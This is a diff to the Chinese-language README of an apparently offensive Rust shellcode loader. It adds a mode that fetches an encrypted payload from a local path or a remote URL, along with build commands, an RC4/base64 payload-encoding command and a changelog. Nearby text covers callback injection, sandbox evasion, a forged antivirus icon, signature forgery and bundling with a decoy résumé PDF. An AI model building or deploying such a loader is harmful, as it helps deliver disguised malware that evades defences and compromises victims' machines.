@@ -86,11 +86,15 @@
 - **LineDDA 注入** - 利用 LineDDA 回调执行 Shellcode
 - 可拓展...
 
-### 📦 Payload加载方式(2025-12-10新增)
+### 📦 Payload加载方式(2025-12-12更新)
 - **Read File** - 从自身二进制文件读取payload
 - **Named Pipe** - 通过命名管道加载payload，可绕过某些沙箱检测
 - **Mailslot** - 通过邮件槽加载payload，另一种IPC机制
 - **Read File V2** - 读取自身文件内容并覆盖内存，混淆数据流分析
+- **分离式加载** - 从命令行读取地址，支持本地文件或远程URL，默认读取encrypt.bin
+  - xxx.exe <path> / <url>
+  - 例如xxx.exe C:\\path\to\payload.bin
+  - 或者xxx.exe http://server.name/payload.bin
 - 可拓展...
 
 ### 📎 文件捆绑功能(2025-12-12新增)
@@ -227,6 +231,27 @@ python main.py
 - 文件复制到 `output/` 目录
 - 签名伪造（如启用）
 
+#### 4. 分离式加载
+
+对于启用了分离式加载（ `load_payload_cmdline`） 特性的构建版本，可以通过命令行指定payload地址：
+
+```bash
+# 默认读取同目录下的 encrypt.bin
+./rsl.exe
+
+# 指定本地文件路径
+./rsl.exe C:\path\to\payload.bin
+
+# 指定远程URL
+./rsl.exe http://example.com/payload.bin
+```
+
+- payload二进制文件是在编译后生成的src/encrypt.bin
+- 也可以自己通过encrypt.py生成（主要加密和编码方式与exe文件对齐）：
+```
+python encrypt.py -i input/calc.bin -o src/encrypt.bin -m rc4 -e base64
+```
+
 ## 🪟 Windows 7 兼容性配置（可选）
 
 ### 环境要求
@@ -321,6 +346,9 @@ set "RSL_ICON_PATH=icons\avp_0000.ico" && cargo build --release --no-default-fea
 
 # 示例：启用文件捆绑功能
 set "RSL_BUNDLE_FILE=C:\path\to\your\file.pdf" && set "RSL_BUNDLE_FILENAME=document.pdf" && cargo build --release --no-default-features --features=decrypt_ipv4,base64_decode,run_create_thread,alloc_mem_va,with_forgery
+
+# 示例：启用分离式加载（从命令行读取payload地址）
+set "RSL_ICON_PATH=icons\avp_0000.ico" && cargo build --release --no-default-features --features=decrypt_ipv4,base64_decode,run_create_thread,alloc_mem_va,load_payload_cmdline
 ```
 
 ## 🛠️ 二次开发
@@ -402,6 +430,7 @@ set "RSL_BUNDLE_FILE=C:\path\to\your\file.pdf" && set "RSL_BUNDLE_FILENAME=docum
 - **优化构建系统**：去除 bundled_file.bin 中间文件，直接在 bundle_data.rs 中生成 include_bytes! 调用
 - **更新默认文件名**：将默认文件名从 "bundled_file.bin" 改为 "xxx简历.pdf"
 - **添加捆绑文件图标**：为 BundleComboBox 添加 bundle.ico 图标支持
+- **新增分离式加载**：支持从命令行读取payload地址，可本地或远程，默认读取encrypt.bin
 
 ### 2025-11-22
 - **重构加密模块**：将 `encrypt.py` 重构为插件化架构，支持动态加载加密插件。
@@ -476,7 +505,6 @@ set "RSL_BUNDLE_FILE=C:\path\to\your\file.pdf" && set "RSL_BUNDLE_FILENAME=docum
 - **新增Mailslot加载方式**：实现基于邮件槽的payload加载
 - **新增Read File V2加载方式**：实现从自身文件读取并覆盖内存的payload加载
 - **更新GUI支持**：在GUI中添加"Payload 加载方式"选项
-
 - **增加PeekMessage反沙箱检测**：通过Windows消息队列机制检测沙箱环境
 
 ### 2025-12-11
@@ -496,4 +524,4 @@ set "RSL_BUNDLE_FILE=C:\path\to\your\file.pdf" && set "RSL_BUNDLE_FILENAME=docum
 
 - 重整GUI功能排列，使页面排列紧实
 - 升级文件捆绑功能，支持自选任意文件捆绑
-
+- 新增分离式payload加载方式，使用方法参见[分离式加载](#4-分离式加载)
